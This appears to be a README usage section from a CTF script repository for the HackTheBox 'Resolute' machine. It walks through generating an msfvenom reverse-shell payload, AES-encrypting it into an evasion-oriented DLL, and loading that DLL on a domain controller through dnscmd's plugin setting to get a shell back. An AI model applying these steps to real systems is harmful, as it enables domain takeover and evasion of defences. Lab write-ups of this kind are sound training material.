### Usage

1. Generate the shellcode in raw format
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -o venom.bin
```

2. Use [aesencrypt.py](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/HTB/Resolute/aesencrypt.py) to generate an AES key and the encrypted version of the generated shellcode. The output of the command should be added in the DLL source code in `unsigned char AESKey[]` and `unsigned char shellcode[]` respectively.
```bash
python3 aesencrypt.py venom.bin
```

3. Compile the DLL source code (`resolute.cpp`) (created with evasion in mind: Encryption of the shellcode + Obfuscation of API calls and strings).
4. Compile the code using [compile-DLL.bat](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/HTB/Resolute/compile-dll.bat). The source code should be in the same directory of `compile-dll.bat` file.
```bash
compile-dll.bat
```
![2024-08-14 01_39_14-x64 Native Tools Command Prompt for VS 2022 (2)](https://github.com/user-attachments/assets/bc494ca9-42d6-421d-8b92-2255301a0a93)

5. Upload the generated dll on the target machine
6. Start a multi handler listener on port **9999** (Port specified in step 1)
7. Run the commands below on the target machine (DC)
```powershell
> dnscmd Resolute /config /serverlevelplugindll C:\Users\ryan\Documents\resolute.dll
> sc.exe stop dns
> sc.exe start dns
```

![2024-08-14 01_43_05-kali Linux - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/user-attachments/assets/c2422330-331b-421f-b57d-de53235612f2)

8. Upon the restart of the DNS service, You should get a connection back on your reverse shell listener
![2024-08-14 01_27_07-kali Linux - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/user-attachments/assets/461c6de1-dfbc-4d24-856d-e9cd820ff7c5)
